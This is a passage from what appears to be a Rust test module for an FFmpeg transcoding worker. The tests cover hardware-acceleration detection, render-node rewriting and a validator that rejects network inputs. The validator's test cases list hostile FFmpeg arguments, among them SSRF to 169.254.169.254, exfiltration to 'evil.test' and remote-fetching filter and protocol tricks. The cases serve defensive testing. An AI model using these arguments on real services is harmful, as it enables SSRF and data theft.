        assert_eq!(vaapi_cap.render_nodes, vec!["/dev/dri/renderD128"]);

        // 2. Intel QSV derived from VA-API + OpenCL HDR tonemapping (mixed hardware!)
        let qsv_mixed_args = vec_s(&[
            "-init_hw_device", "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device", "qsv=qs@va",
            "-init_hw_device", "opencl=ocl@va",
            "-filter_hw_device", "qs",
            "-hwaccel", "qsv",
            "-hwaccel_output_format", "qsv",
            "-c:v", "hevc_qsv",
            "-i", "file:/srv/media/hdr.mkv",
            "-vf", "vpp_qsv=format=p010,hwmap=derive_device=opencl,tonemap_opencl=format=nv12:p=bt709:t=bt709:m=bt709:tonemap=bt2390,hwmap=derive_device=qsv:reverse=1,format=qsv",
            "-codec:v:0", "hevc_qsv",
            "/var/cache/jellyfin/transcodes/out.m3u8",
        ]);
        let qsv_cap = required_capability(&qsv_mixed_args);
        assert_eq!(qsv_cap.hwaccel, Some(HwAccel::Qsv));
        assert!(qsv_cap.required_hwaccels.contains(&HwAccel::Vaapi));
        assert!(qsv_cap.required_hwaccels.contains(&HwAccel::Qsv));
        assert!(qsv_cap.required_hwaccels.contains(&HwAccel::OpenCl));
        assert_eq!(qsv_cap.encoder.as_deref(), Some("hevc_qsv"));
        assert!(qsv_cap.filters.contains(&"vpp_qsv".to_string()));
        assert!(qsv_cap.filters.contains(&"tonemap_opencl".to_string()));
        assert_eq!(qsv_cap.render_nodes, vec!["/dev/dri/renderD128"]);

        // 3. NVIDIA NVENC + CUVID decode + CUDA scaling
        let nvenc_args = vec_s(&[
            "-init_hw_device",
            "cuda=cu:0",
            "-filter_hw_device",
            "cu",
            "-hwaccel",
            "cuda",
            "-hwaccel_output_format",
            "cuda",
            "-c:v",
            "hevc_cuvid",
            "-i",
            "file:/srv/media/movie.mkv",
            "-vf",
            "scale_cuda=1920:1080:format=nv12",
            "-codec:v:0",
            "h264_nvenc",
            "/var/cache/jellyfin/transcodes/nv.m3u8",
        ]);
        let nvenc_cap = required_capability(&nvenc_args);
        assert_eq!(nvenc_cap.hwaccel, Some(HwAccel::Cuda));
        assert_eq!(nvenc_cap.required_hwaccels, vec![HwAccel::Cuda]);
        assert_eq!(nvenc_cap.encoder.as_deref(), Some("h264_nvenc"));
        assert_eq!(nvenc_cap.filters, vec!["scale_cuda"]);
        assert!(nvenc_cap.render_nodes.is_empty());

        // 4. Software transcode with subtitle burn-in whose path contains hw keywords & renderD128
        let sw_sub_args = vec_s(&[
            "-i", "file:/srv/media/vaapi_cuda_qsv/renderD128_demo.mkv",
            "-vf", "scale=1280:720,subtitles=filename='/var/cache/jellyfin/subtitles/vaapi_qsv_cuda_renderD128.ass':fontsdir='/var/cache/jellyfin/fonts'",
            "-codec:v:0", "libx264",
            "-preset", "veryfast",
            "/var/cache/jellyfin/transcodes/sw.m3u8",
        ]);
        let sw_cap = required_capability(&sw_sub_args);
        assert_eq!(sw_cap.hwaccel, None);
        assert!(sw_cap.required_hwaccels.is_empty());
        assert_eq!(sw_cap.encoder.as_deref(), Some("libx264"));
        assert!(sw_cap.filters.is_empty());
        assert!(sw_cap.render_nodes.is_empty());
        assert!(sw_cap.is_software_only());

        // 5. Mixed VA-API decode/scale + software subtitle burn-in + VA-API encode
        let vaapi_sub_args = vec_s(&[
            "-vaapi_device", "/dev/dri/renderD128",
            "-hwaccel", "vaapi",
            "-hwaccel_output_format", "vaapi",
            "-i", "file:/srv/media/anime.mkv",
            "-filter_complex",
            "[0:v]scale_vaapi=w=1920:h=1080:format=nv12,hwdownload,format=nv12,subtitles=filename='/var/cache/jellyfin/subtitles/cuda_ep01\\,v2.ass',format=nv12,hwupload[out]",
            "-map", "[out]",
            "-c:v", "hevc_vaapi",
            "/var/cache/jellyfin/transcodes/sub.m3u8",
        ]);
        let vaapi_sub_cap = required_capability(&vaapi_sub_args);
        assert_eq!(vaapi_sub_cap.hwaccel, Some(HwAccel::Vaapi));
        assert_eq!(vaapi_sub_cap.required_hwaccels, vec![HwAccel::Vaapi]);
        assert_eq!(vaapi_sub_cap.encoder.as_deref(), Some("hevc_vaapi"));
        assert_eq!(vaapi_sub_cap.filters, vec!["scale_vaapi"]);
        assert_eq!(vaapi_sub_cap.render_nodes, vec!["/dev/dri/renderD128"]);

        // 6. Hardware decode (cuvid) -> software encode (libx264): input decoder must NOT overwrite output encoder
        let mixed_dec_enc = vec_s(&[
            "-c:v",
            "hevc_cuvid",
            "-i",
            "/srv/media/clip.mkv",
            "-c:v",
            "libx264",
            "/var/cache/jellyfin/transcodes/out.m3u8",
        ]);
        let mixed_cap = required_capability(&mixed_dec_enc);
        assert_eq!(mixed_cap.encoder.as_deref(), Some("libx264"));
        assert_eq!(mixed_cap.hwaccel, Some(HwAccel::Cuda));
        assert_eq!(mixed_cap.required_hwaccels, vec![HwAccel::Cuda]);

        // 7. Remux / stream copy
        let remux = vec_s(&[
            "-i",
            "/srv/media/movie.mkv",
            "-c:v",
            "copy",
            "-c:a",
            "aac",
            "/var/cache/jellyfin/transcodes/remux.m3u8",
        ]);
        let remux_cap = required_capability(&remux);
        assert_eq!(remux_cap.encoder.as_deref(), Some("copy"));
        assert_eq!(remux_cap.required_encoder(), None);
        assert!(remux_cap.is_software_only());

        // 8. Unquoted backslash-escaped Jellyfin subtitle path with commas/brackets/hw names
        let escaped_sub = vec_s(&[
            "-i",
            "/srv/media/Show/ep1.mkv",
            "-vf",
            r"scale=1280:720,subtitles=f=/var/cache/jellyfin/subtitles/Show\, \[1080p\]_vaapi_qsv_cuda.ass:fontsdir=/var/cache/jellyfin/fonts",
            "-c:v",
            "libx264",
            "/var/cache/jellyfin/transcodes/sub_esc.m3u8",
        ]);
        let escaped_sub_cap = required_capability(&escaped_sub);
        assert!(escaped_sub_cap.is_software_only());
        assert_eq!(escaped_sub_cap.encoder.as_deref(), Some("libx264"));
        assert!(escaped_sub_cap.filters.is_empty());
    }

    #[test]
    fn exact_token_boundary_render_node_replacement() {
        let args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "vaapi=va2:/dev/dri/renderD1280,driver=iHD",
            "-init_hw_device",
            "qsv=qs@va",
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-hwaccel_device",
            "/dev/dri/renderD128",
            "-hwaccel_device:v:0",
            "/dev/dri/renderD1280",
            "-i",
            "/srv/media/dev/dri/renderD128/movie.mkv",
            "-vf",
            "subtitles=filename='/tmp/dev/dri/renderD128.ass',scale_vaapi=format=nv12",
            "-metadata",
            "comment=/dev/dri/renderD128",
            "-c:v",
            "h264_vaapi",
            "/var/cache/jellyfin/transcodes/dev/dri/renderD128.m3u8",
        ]);

        let rewritten = rewrite_render_node(&args, "/dev/dri/renderD128", "/dev/dri/renderD129");
        assert_eq!(rewritten[1], "vaapi=va:/dev/dri/renderD129,driver=iHD");
        // Prefix-colliding renderD1280 MUST NOT be corrupted to renderD1290!
        assert_eq!(rewritten[3], "vaapi=va2:/dev/dri/renderD1280,driver=iHD");
        assert_eq!(rewritten[5], "qsv=qs@va");
        assert_eq!(rewritten[7], "/dev/dri/renderD129");
        assert_eq!(rewritten[9], "/dev/dri/renderD129");
        assert_eq!(rewritten[11], "/dev/dri/renderD1280");
        // Non-device paths (input, subtitle filter, metadata, output) MUST stay byte-identical!
        assert_eq!(rewritten[13], "/srv/media/dev/dri/renderD128/movie.mkv");
        assert_eq!(
            rewritten[15],
            "subtitles=filename='/tmp/dev/dri/renderD128.ass',scale_vaapi=format=nv12"
        );
        assert_eq!(rewritten[17], "comment=/dev/dri/renderD128");
        assert_eq!(
            rewritten[20],
            "/var/cache/jellyfin/transcodes/dev/dri/renderD128.m3u8"
        );

        // rewrite_any_render_node rewrites BOTH renderD128 and renderD1280 in device slots only
        let any_rewritten = rewrite_any_render_node(&args, "/dev/dri/renderD130");
        assert_eq!(any_rewritten[1], "vaapi=va:/dev/dri/renderD130,driver=iHD");
        assert_eq!(any_rewritten[3], "vaapi=va2:/dev/dri/renderD130,driver=iHD");
        assert_eq!(any_rewritten[7], "/dev/dri/renderD130");
        assert_eq!(any_rewritten[9], "/dev/dri/renderD130");
        assert_eq!(any_rewritten[11], "/dev/dri/renderD130");
        assert_eq!(any_rewritten[13], "/srv/media/dev/dri/renderD128/movie.mkv");
        assert_eq!(
            any_rewritten[15],
            "subtitles=filename='/tmp/dev/dri/renderD128.ass',scale_vaapi=format=nv12"
        );
    }

    #[test]
    fn has_network_input_detects_remote_and_nested_protocols_without_false_positives() {
        let positive_cases: &[(&str, &[&str])] = &[
            (
                "http input",
                &["-i", "http://example.com/live.m3u8", "out.ts"],
            ),
            (
                "https input",
                &["-i", "https://example.com/live.m3u8", "out.ts"],
            ),
            (
                "uppercase HTTP",
                &["-i", "HTTP://EXAMPLE.COM/live.m3u8", "out.ts"],
            ),
            (
                "rtsp input",
                &["-i", "rtsp://192.168.1.10:554/stream", "out.ts"],
            ),
            (
                "rtsps input",
                &["-i", "rtsps://192.168.1.10:322/stream", "out.ts"],
            ),
            (
                "rtmp input",
                &["-i", "rtmp://live.example.com/app/key", "out.ts"],
            ),
            (
                "rtmps input",
                &["-i", "rtmps://live.example.com/app/key", "out.ts"],
            ),
            (
                "rtmpt input",
                &["-i", "rtmpt://live.example.com/app/key", "out.ts"],
            ),
            ("rtp input", &["-i", "rtp://239.0.0.1:5004", "out.ts"]),
            ("udp input", &["-i", "udp://239.0.0.1:1234", "out.ts"]),
            ("tcp input", &["-i", "tcp://10.0.0.1:8080", "out.ts"]),
            ("tls input", &["-i", "tls://10.0.0.1:8443", "out.ts"]),
            ("srt input", &["-i", "srt://10.0.0.1:9000", "out.ts"]),
            ("mms input", &["-i", "mms://example.com/stream", "out.ts"]),
            ("mmsh input", &["-i", "mmsh://example.com/stream", "out.ts"]),
            ("mmst input", &["-i", "mmst://example.com/stream", "out.ts"]),
            (
                "ftp input",
                &["-i", "ftp://files.example.com/a.mkv", "out.ts"],
            ),
            (
                "ftps input",
                &["-i", "ftps://files.example.com/a.mkv", "out.ts"],
            ),
            (
                "sftp input",
                &["-i", "sftp://files.example.com/a.mkv", "out.ts"],
            ),
            (
                "smb input",
                &["-i", "smb://nas.local/media/a.mkv", "out.ts"],
            ),
            (
                "nfs input",
                &["-i", "nfs://nas.local/export/a.mkv", "out.ts"],
            ),
            (
                "dav input",
                &["-i", "dav://cloud.example.com/a.mkv", "out.ts"],
            ),
            (
                "davs input",
                &["-i", "davs://cloud.example.com/a.mkv", "out.ts"],
            ),
            ("gopher input", &["-i", "gopher://127.0.0.1:70/1", "out.ts"]),
            (
                "icecast input",
                &["-i", "icecast://radio.example.com:8000/a", "out.ts"],
            ),
            ("sctp input", &["-i", "sctp://10.0.0.1:5000", "out.ts"]),
            (
                "unix uri input",
                &["-i", "unix:///run/aetherflow/runner.sock", "out.ts"],
            ),
            (
                "unix single-colon input",
                &["-i", "unix:/run/aetherflow/runner.sock", "out.ts"],
            ),
            (
                "tcp single-colon input",
                &["-i", "tcp:127.0.0.1:8080", "out.ts"],
            ),
            (
                "hls+http compound",
                &["-i", "hls+http://example.com/master.m3u8", "out.ts"],
            ),
            (
                "hls+https compound",
                &["-i", "hls+https://example.com/master.m3u8", "out.ts"],
            ),
            (
                "async wrapper",
                &["-i", "async:http://example.com/a.mkv", "out.ts"],
            ),
            (
                "cache wrapper",
                &["-i", "cache:https://example.com/a.mkv", "out.ts"],
            ),
            (
                "crypto wrapper",
                &["-i", "crypto:http://example.com/seg.ts", "out.ts"],
            ),
            (
                "crypto+http compound",
                &["-i", "crypto+http://example.com/seg.ts", "out.ts"],
            ),
            (
                "subfile wrapper",
                &["-i", "subfile:http://example.com/a.mkv", "out.ts"],
            ),
            (
                "subfile with inline options",
                &[
                    "-i",
                    "subfile,,start,0,end,1024,,:http://169.254.169.254/latest",
                    "out.ts",
                ],
            ),
            (
                "concat with remote tail",
                &[
                    "-i",
                    "concat:/srv/media/1.ts|http://example.com/2.ts",
                    "out.ts",
                ],
            ),
            (
                "multi-layer nested wrapper",
                &[
                    "-i",
                    "async:cache:crypto:https://example.com/seg.ts",
                    "out.ts",
                ],
            ),
            (
                "excessive wrapper nesting fails closed",
                &[
                    "-i",
                    "async:async:async:async:async:async:async:async:file:/srv/a.mkv",
                    "out.ts",
                ],
            ),
            (
                "second input is remote",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-i",
                    "https://example.com/sub.vtt",
                    "out.m3u8",
                ],
            ),
            (
                "positional network output",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-f",
                    "mpegts",
                    "udp://10.0.0.1:1234",
                ],
            ),
            (
                "positional network output after --",
                &["-i", "/srv/media/a.mkv", "--", "http://evil.test/exfil"],
            ),
            (
                "tee muxer network output",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-f",
                    "tee",
                    "[f=mpegts]udp://10.0.0.1:1234|[f=mpegts]/tmp/local.ts",
                ],
            ),
            (
                "progress URL exfil",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-progress",
                    "http://169.254.169.254/p",
                    "out.ts",
                ],
            ),
            (
                "http_proxy flag",
                &[
                    "-http_proxy",
                    "http://127.0.0.1:8080",
                    "-i",
                    "/srv/media/a.mkv",
                    "out.ts",
                ],
            ),
            (
                "lavfi movie filter SSRF",
                &[
                    "-f",
                    "lavfi",
                    "-i",
                    r"movie=http\://169.254.169.254/latest",
                    "out.ts",
                ],
            ),
            (
                "vf movie quoted URL with query params",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-vf",
                    "movie='https://evil.test/a.mp4?token=abc'",
                    "out.ts",
                ],
            ),
            (
                "filter_complex amovie filename URL",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-filter_complex",
                    "amovie=filename='http://evil.test/a.mp3'[a]",
                    "out.ts",
                ],
            ),
            (
                "vf subtitles URL",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-vf",
                    r"subtitles=https\://evil.test/s.srt",
                    "out.ts",
                ],
            ),
            (
                "vf zmq network filter",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-vf",
                    r"zmq=b=tcp\://127.0.0.1\:5555",
                    "out.ts",
                ],
            ),
            (
                "caller protocol_whitelist includes http",
                &[
                    "-protocol_whitelist",
                    "file,http,https,tcp,tls,crypto",
                    "-i",
                    "/srv/media/playlist.m3u8",
                    "out.ts",
                ],
            ),
            (
                "caller protocol_whitelist includes unix",
                &[
                    "-protocol_whitelist",
                    "file,unix",
                    "-i",
                    "/srv/media/a.mkv",
                    "out.ts",
                ],
            ),
            (
                "caller protocol_whitelist all",
                &[
                    "-protocol_whitelist",
                    "all",
                    "-i",
                    "/srv/media/a.mkv",
                    "out.ts",
                ],
            ),
            (
                "caller protocol_whitelist empty",
                &[
                    "-protocol_whitelist",
                    "",
                    "-i",
                    "/srv/media/a.mkv",
                    "out.ts",
                ],
            ),
            (
                "caller protocol_whitelist dangling",
                &["-i", "/srv/media/a.mkv", "out.ts", "-protocol_whitelist"],
            ),
        ];

        for (name, args) in positive_cases {
            let owned = vec_s(args);
            assert!(
                has_network_input(&owned),
                "expected has_network_input=true for case '{name}': {args:?}"
            );
            assert!(
                validate_worker_args(&owned).is_err(),
                "expected validate_worker_args=Err for case '{name}': {args:?}"
            );
        }

        let negative_cases: &[(&str, &[&str])] = &[
            ("local path", &["-i", "/srv/media/movies/4k.mkv", "-c:v", "h264_vaapi", "out.m3u8"]),
            ("file single colon", &["-i", "file:/srv/media/movies/4k.mkv", "out.m3u8"]),
            ("file triple slash", &["-i", "file:///srv/media/movies/4k.mkv", "out.m3u8"]),
            ("file localhost", &["-i", "file://localhost/srv/media/movies/4k.mkv", "out.m3u8"]),
            ("local path with colon", &["-i", "/media/Movie: Part 1.mkv", "out.m3u8"]),
            ("file prefix with colon", &["-i", "file:/media/Movie: Part 1.mkv", "out.m3u8"]),
            ("relative filename with colon", &["-i", "Movie: Part 1.mkv", "out.m3u8"]),
            (
                "timestamps and seek flags",
                &["-ss", "00:01:23.456", "-i", "/srv/media/a.mkv", "-to", "00:05:00", "out.m3u8"],
            ),
            ("pipe input and output", &["-i", "pipe:0", "-c:v", "libx264", "pipe:1"]),
            ("dash stdin and stdout", &["-i", "-", "-c:v", "libx264", "-"]),
            ("fd input and output", &["-i", "fd:0", "-c:v", "libx264", "fd:1"]),
            ("data URI", &["-i", "data:image/png;base64,iVBORw0KGgo=", "out.mp4"]),
            ("local subfile wrapper", &["-i", "subfile,,start,0,end,1024,,:/srv/media/a.mkv", "out.ts"]),
            ("local crypto wrapper", &["-i", "crypto:file:/srv/media/a.ts", "out.ts"]),
            ("local crypto+file compound", &["-i", "crypto+file:///srv/media/a.ts", "out.ts"]),
            ("local async/cache wrapper", &["-i", "async:cache:file:///srv/media/a.mkv", "out.ts"]),
            ("local concat wrapper", &["-i", "concat:/srv/media/1.ts|/srv/media/2.ts", "out.ts"]),
            (
                "lavfi parity testsrc2",
                &[
                    "-f",
                    "lavfi",
                    "-i",
                    "testsrc2=size=640x360:rate=24",
                    "-t",
                    "1",
                    "-c:v",
                    "libx264",
                    "/var/cache/jellyfin/transcodes/.af-parity.ts",
                ],
            ),
            (
                "URL in metadata value must not false-positive",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-metadata",
                    "comment=https://jellyfin.org",
                    "-metadata",
                    "title=http://movie",
                    "out.m3u8",
                ],
            ),
            (
                "local subtitle filter with colon in filename",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-vf",
                    "subtitles=filename='/var/cache/jellyfin/subtitles/Show: Episode 1.ass':fontsdir='/var/cache/jellyfin/fonts'",
                    "out.m3u8",
                ],
            ),
            (
                "drawtext literal URL watermark",
                &[
                    "-i",
                    "/srv/media/a.mkv",
                    "-vf",
                    "drawtext=text='https://example.com':fontfile=/usr/share/fonts/a.ttf",
                    "out.m3u8",
                ],
            ),
            (
                "bracketed local filename",
                &["-i", "/srv/media/a.mkv", "[SubGroup] Anime - 01.mkv"],
            ),
            (
                "local progress pipe",
                &["-i", "/srv/media/a.mkv", "-progress", "pipe:1", "out.m3u8"],
            ),
            (
                "caller local-only protocol_whitelist subset",
                &["-protocol_whitelist", "file,pipe", "-i", "/srv/media/a.mkv", "out.m3u8"],
            ),
            (
                "caller full local-only protocol_whitelist",
                &[
                    "-protocol_whitelist",
                    WORKER_LOCAL_PROTOCOL_WHITELIST,
                    "-i",
                    "/srv/media/a.mkv",
                    "out.m3u8",
                ],
            ),
        ];

        for (name, args) in negative_cases {
            let owned = vec_s(args);
            assert!(
                !has_network_input(&owned),
                "expected has_network_input=false for case '{name}': {args:?}"
            );
            assert!(
                validate_worker_args(&owned).is_ok(),
                "expected validate_worker_args=Ok for case '{name}': {args:?}"
            );
        }
    }

    #[test]
    fn inject_local_protocol_whitelist_covers_every_input_without_widening_caller_subset() {
        // Single input receives whitelist directly before `-i`.
        let single = inject_local_protocol_whitelist(&[
            "-hwaccel",
            "vaapi",
            "-i",
            "/srv/media/a.mkv",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(
            single,
            vec_s(&[
                "-hwaccel",
                "vaapi",
                "-protocol_whitelist",
                WORKER_LOCAL_PROTOCOL_WHITELIST,
                "-i",
                "/srv/media/a.mkv",
                "-c:v",
                "h264_vaapi",
                "out.m3u8",
            ])
        );

        // Multi-input: first input keeps caller's narrower local whitelist, second input gets default local whitelist.
        let multi = inject_local_protocol_whitelist(&[
            "-protocol_whitelist",
            "file,pipe",
            "-i",
            "/srv/media/a.mkv",
            "-i",
            "/srv/media/sub.srt",
            "out.m3u8",
        ]);
        assert_eq!(
            multi,
            vec_s(&[
                "-protocol_whitelist",
                "file,pipe",
                "-i",
                "/srv/media/a.mkv",
                "-protocol_whitelist",
                WORKER_LOCAL_PROTOCOL_WHITELIST,
                "-i",
                "/srv/media/sub.srt",
                "out.m3u8",
            ])
        );

        // Metadata value literally "-i" does not trigger spurious injection.
        let meta = inject_local_protocol_whitelist(&[
            "-i",
            "/srv/media/a.mkv",
            "-metadata",
            "-i",
            "out.m3u8",
        ]);
        assert_eq!(
            meta,
            vec_s(&[
                "-protocol_whitelist",
                WORKER_LOCAL_PROTOCOL_WHITELIST,
                "-i",
                "/srv/media/a.mkv",
                "-metadata",
                "-i",
                "out.m3u8",
            ])
        );
    }

    #[test]
    fn required_capability_extracts_decoder_hw_decoder_and_vaapi_tonemap() {
        let av1_vaapi = required_capability(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-hwaccel",
            "vaapi",
            "-c:v",
            "AV1",
            "-i",
            "/srv/media/av1.mkv",
            "-vf",
            "tonemap_vaapi=format=nv12:p=bt709:t=bt709:m=bt709",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(av1_vaapi.decoder.as_deref(), Some("av1"));
        assert_eq!(av1_vaapi.required_hw_decoder(), Some("av1"));
        assert!(av1_vaapi.requires_vaapi_tonemap);

        let qsv_dec = required_capability(&[
            "-c:v",
            "mpeg2_qsv",
            "-i",
            "/srv/media/dvd.mpg",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        assert_eq!(qsv_dec.decoder.as_deref(), Some("mpeg2_qsv"));
        assert_eq!(qsv_dec.required_hw_decoder(), Some("mpeg2video"));
        assert!(!qsv_dec.requires_vaapi_tonemap);

        // Explicit software decoder with HW encode does not require HW decode.
        let sw_dec_hw_enc = required_capability(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-c:v",
            "libdav1d",
            "-i",
            "/srv/media/av1.mkv",
            "-vf",
            "format=nv12,hwupload",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        assert_eq!(sw_dec_hw_enc.decoder.as_deref(), Some("libdav1d"));
        assert_eq!(sw_dec_hw_enc.required_hw_decoder(), None);

        // Pure software transcode has decoder recorded, required_hw_decoder = None.
        let pure_sw = required_capability(&[
            "-c:v",
            "hevc",
            "-i",
            "/srv/media/a.mkv",
            "-c:v",
            "libx264",
            "out.m3u8",
        ]);
        assert_eq!(pure_sw.decoder.as_deref(), Some("hevc"));
        assert_eq!(pure_sw.required_hw_decoder(), None);
    }

    #[test]
    fn plan_backend_adaptation_covers_native_cross_gpu_prefer_qsv_and_cpu() {
        use af_hardware::RenderNode;
        use std::path::PathBuf;

        let amd_node = RenderNode {
            path: PathBuf::from("/dev/dri/renderD128"),
            vendor_id: Some("0x1002".to_string()),
        };
        let intel_node = RenderNode {
            path: PathBuf::from("/dev/dri/renderD129"),
            vendor_id: Some("0x8086".to_string()),
        };

        let amd_encoders = vec_s(&["h264_vaapi", "hevc_vaapi", "libx264", "libx265"]);
        let intel_encoders = vec_s(&[
            "h264_vaapi",
            "hevc_vaapi",
            "h264_qsv",
            "hevc_qsv",
            "libx264",
            "libx265",
        ]);
        let cpu_encoders = vec_s(&["libx264", "libx265"]);
        let hd630_decoders = vec_s(&["h264", "hevc", "vp9"]);

        // 1. QSV job on AMD-only worker
        let qsv_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "qsv=qs@va",
            "-filter_hw_device",
            "qs",
            "-hwaccel",
            "qsv",
            "-hwaccel_output_format",
            "qsv",
            "-c:v",
            "hevc_qsv",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            "vpp_qsv=w=1920:h=1080:format=nv12",
            "-c:v",
            "h264_qsv",
            "out.m3u8",
        ]);
        let qsv_cap = required_capability(&qsv_args);
        assert_eq!(
            plan_backend_adaptation(
                &qsv_args,
                &qsv_cap,
                BackendAdaptMode::Off,
                &amd_encoders,
                &hd630_decoders,
                std::slice::from_ref(&amd_node),
            ),
            None
        );
        assert_eq!(
            plan_backend_adaptation(
                &qsv_args,
                &qsv_cap,
                BackendAdaptMode::Gpu,
                &amd_encoders,
                &hd630_decoders,
                std::slice::from_ref(&amd_node),
            ),
            Some(AdaptedTargetBackend::Vaapi)
        );
        assert_eq!(
            plan_backend_adaptation(
                &qsv_args,
                &qsv_cap,
                BackendAdaptMode::Off,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Native)
        );

        // 2. Clean VA-API job on Intel with PreferQsv upgrades to Qsv; tonemap_vaapi stays Native on Intel and fails on AMD.
        let vaapi_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128",
            "-filter_hw_device",
            "va",
            "-hwaccel",
            "vaapi",
            "-hwaccel_output_format",
            "vaapi",
            "-c:v",
            "hevc",
            "-i",
            "/srv/media/in.mkv",
            "-vf",
            "scale_vaapi=w=1920:h=1080:format=nv12",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let vaapi_cap = required_capability(&vaapi_args);
        assert_eq!(
            plan_backend_adaptation(
                &vaapi_args,
                &vaapi_cap,
                BackendAdaptMode::PreferQsv,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Qsv)
        );
        assert_eq!(
            plan_backend_adaptation(
                &vaapi_args,
                &vaapi_cap,
                BackendAdaptMode::Gpu,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Native)
        );

        let tonemap_vaapi_args = vec_s(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-hwaccel",
            "vaapi",
            "-i",
            "/srv/media/hdr.mkv",
            "-vf",
            "tonemap_vaapi=format=nv12",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let tonemap_vaapi_cap = required_capability(&tonemap_vaapi_args);
        assert_eq!(
            plan_backend_adaptation(
                &tonemap_vaapi_args,
                &tonemap_vaapi_cap,
                BackendAdaptMode::All,
                &amd_encoders,
                &hd630_decoders,
                std::slice::from_ref(&amd_node),
            ),
            None
        );
        assert_eq!(
            plan_backend_adaptation(
                &tonemap_vaapi_args,
                &tonemap_vaapi_cap,
                BackendAdaptMode::PreferQsv,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Native)
        );

        // 3. AV1 HW decode unsupported on HD 630 -> None in Gpu, Cpu in All!
        let av1_vaapi_args = vec_s(&[
            "-vaapi_device",
            "/dev/dri/renderD128",
            "-hwaccel",
            "vaapi",
            "-c:v",
            "av1",
            "-i",
            "/srv/media/av1.mkv",
            "-vf",
            "scale_vaapi=w=1280:h=720:format=nv12",
            "-c:v",
            "h264_vaapi",
            "out.m3u8",
        ]);
        let av1_cap = required_capability(&av1_vaapi_args);
        assert_eq!(
            plan_backend_adaptation(
                &av1_vaapi_args,
                &av1_cap,
                BackendAdaptMode::Gpu,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            None
        );
        assert_eq!(
            plan_backend_adaptation(
                &av1_vaapi_args,
                &av1_cap,
                BackendAdaptMode::All,
                &intel_encoders,
                &hd630_decoders,
                std::slice::from_ref(&intel_node),
            ),
            Some(AdaptedTargetBackend::Cpu)
        );

        // 4. CPU-only worker adapts VA-API H.264 only when mode == All.
        assert_eq!(
            plan_backend_adaptation(
                &vaapi_args,
                &vaapi_cap,
                BackendAdaptMode::Gpu,
                &cpu_encoders,
                &[],
                &[],
            ),
            None
        );
        assert_eq!(
            plan_backend_adaptation(
                &vaapi_args,
                &vaapi_cap,
                BackendAdaptMode::All,
                &cpu_encoders,
                &[],
                &[],
            ),
            Some(AdaptedTargetBackend::Cpu)
        );
    }

    #[test]
    fn adapt_args_qsv_to_vaapi_rewrites_pipeline_and_preserves_non_device_paths() {
        let qsv_opencl_args = vec_s(&[
            "-init_hw_device",
            "vaapi=va:/dev/dri/renderD128,driver=iHD",
            "-init_hw_device",
            "qsv=qs@va",
            "-init_hw_device",
            "opencl=ocl@va",
            "-filter_hw_device",
            "qs",
            "-hwaccel",
            "qsv",
            "-hwaccel_output_format",
            "qsv",
            "-c:v",
            "hevc_qsv",
            "-i",
            "/srv/media/qsv_renderD128/hdr.mkv",
            "-vf",
            "vpp_qsv=format=p010,hwmap=derive_device=opencl,tonemap_opencl=format=nv12:p=bt709,hwmap=derive_device=qsv:reverse=1,format=qsv",
            "-codec:v:0",
            "hevc_qsv",
            "-preset",
            "faster",
            "-look_ahead",
            "1",
            "-look_ahead_depth",
            "40",
            "-async_depth",
            "4",
            "-low_power",
            "1",
            "-extbrc",
            "1",
            "-mbbrc",
            "1",
            "-b_strategy",
            "1",
            "-adaptive_i",
            "1",
            "-adaptive_b",
            "1",
            "-global_quality",
            "21",
            "-metadata",
            "title=hevc_qsv_demo",
            "/var/cache/jellyfin/transcodes/qsv.m3u8",
        ]);

        let adapted = adapt_args_for_backend(
            &qsv_opencl_args,
            AdaptedTargetBackend::Vaapi,
            Some("/dev/dri/renderD129"),
        )
        .expect("adapt QSV+OpenCL to VA-API");

        assert_eq!(
            adapted,
            vec_s(&[
                "-init_hw_device",
                "vaapi=va:/dev/dri/renderD129",
                "-init_hw_device",
                "opencl=ocl@va",
                "-filter_hw_device",
                "va",
                "-hwaccel",
                "vaapi",
                "-hwaccel_output_format",
                "vaapi",
                "-c:v",
                "hevc",
                "-i",
                "/srv/media/qsv_renderD128/hdr.mkv",
                "-vf",
                "scale_vaapi=format=p010,hwmap=derive_device=opencl,tonemap_opencl=format=nv12:p=bt709,hwmap=derive_device=vaapi:reverse=1,format=vaapi",
                "-codec:v:0",
                "hevc_vaapi",
                "-qp",
                "21",
                "-metadata",
                "title=hevc_qsv_demo",
                "/var/cache/jellyfin/transcodes/qsv.m3u8",
            ])
        );

